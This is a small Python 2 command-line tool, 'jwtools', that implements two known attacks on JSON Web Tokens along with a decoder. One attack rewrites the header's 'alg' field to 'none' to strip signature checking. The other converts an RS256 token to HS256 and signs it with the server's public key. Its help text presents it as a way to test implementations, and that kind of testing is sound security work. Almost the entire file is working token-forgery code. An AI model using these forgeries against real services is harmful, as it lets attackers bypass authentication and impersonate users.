#coding: utf-8
import jwt,sys,argparse,json

#infos
def show_decoded_token(token):
    header = jwt.utils.base64url_decode(token.split('.')[0])
    payload = jwt.utils.base64url_decode(token.split('.')[1])
    print "\n[+] Decoded token"
    print "\tHeader: %s"%header
    print "\tPayload: %s"%payload

#change alg to none
def change_alg_to_none(token):
    header = json.loads(jwt.utils.base64url_decode(token.split('.')[0]))
    header[u"alg"] = u"none"
    header = jwt.utils.base64url_encode(str(dict((str(k).encode('ascii'), str(v).encode('ascii')) for (k, v) in header.items())).replace(' ','').replace("'",'"'))
    print "\n[+] Signature algorithm successfuly changed to 'none'."
    print "[+] New token: %s.%s"%(header,token.split('.')[1])
    
#change alg RS256 to HS256 and sign with public key
def change_alg_rs256_to_hs256(token,key):
    try:
        public = open(key, 'r').read()
        payload = jwt.decode(token, verify=False)
        new_token = jwt.encode(payload, public, algorithm='HS256')
        print "\n[+] Signature algorithm successfuly changed to 'HS256'."
        print "[+] New token signed with public key: %s"%(new_token)
    except IOError:
        print "\nError: Could not open file '%s'"%(key)
        sys.exit(1)
    except jwt.exceptions.DecodeError:
        print "\nError: Could not decode token."
        sys.exit(1)


# Initializes the parser
def init_parser():
    parser = argparse.ArgumentParser(prog='./jwtools.py',description='Known attacks against JSON Web Tokens in order to test implementations security.',formatter_class=argparse.RawTextHelpFormatter)
    parser.add_argument('token', action='store', type=str, help="The JWT you want to modify.")
    parser.add_argument("action", action="store", type=str, help="info: displays decoded token content.\nto-none: replaces token 'alg' field with 'none'.\nto-hs256: replaces token 'alg' field with 'HS256' and signs it with given public key.", choices=["info","to-none","to-hs256"], default="info")
    parser.add_argument('-v','--version', action='version', version='jwtools version 0.1')
    parser.add_argument("-p", "--public", action="store", help="The public key associated with the token")
    args = parser.parse_args()


    if args.action == "info":
        show_decoded_token(args.token)
    elif args.action == "to-none":
        change_alg_to_none(args.token)
    elif args.action == "to-hs256":
        if args.public:
            change_alg_rs256_to_hs256(args.token,args.public)
        else:
            print "You must specify a public key with -p or --public."
            exit(1)

if __name__ == "__main__":
    init_parser()
